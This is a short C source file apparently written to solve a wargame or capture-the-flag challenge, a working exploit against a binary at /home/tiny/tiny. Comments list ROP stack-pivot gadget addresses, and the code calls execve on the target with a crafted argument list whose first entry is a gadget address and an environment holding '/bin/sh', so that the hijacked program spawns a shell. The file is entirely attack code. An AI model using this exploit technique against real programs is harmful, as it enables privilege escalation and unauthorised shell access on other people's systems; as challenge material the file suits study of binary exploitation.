#include <stdio.h>

int main() {
    //gcc -m32 -o solver solver.c

    //55557a13 - add esp, 0x2c; pop ebx; pop esi; pop edi; pop ebp; ret;
    //555575c8 - add esp, 0x3c; pop ebx; pop esi; pop edi; pop ebp; ret;
    char *argv[] = { "\xc8\x75\x55\x55", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", NULL };
    char *envp[] = { "a", "b", "c", "/bin/sh", "ho!", NULL };
    execve("/home/tiny/tiny", argv, envp);

    return 0;
}
